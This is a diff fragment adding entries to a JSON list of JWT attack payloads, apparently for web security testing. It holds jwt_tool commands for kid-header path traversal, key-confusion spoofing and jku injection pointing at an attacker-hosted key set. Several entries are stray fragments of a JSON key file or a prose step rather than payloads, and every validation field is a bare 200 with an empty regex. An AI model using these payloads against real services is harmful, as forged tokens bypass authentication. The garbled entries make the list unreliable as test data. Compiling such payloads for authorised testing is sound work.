+    "payload_string": "python3 jwt_tool.py <JWT> -I -hc kid -hv \"/proc/sys/kernel/randomize_va_space\" -S hs256 -p \"2\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37394",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"keys\": [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37395",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37396",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "\"n\": \"nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37397",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py JWT_HERE -X s",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37398",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37399",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37400",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "[Signed with new Private key; Public key exported]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
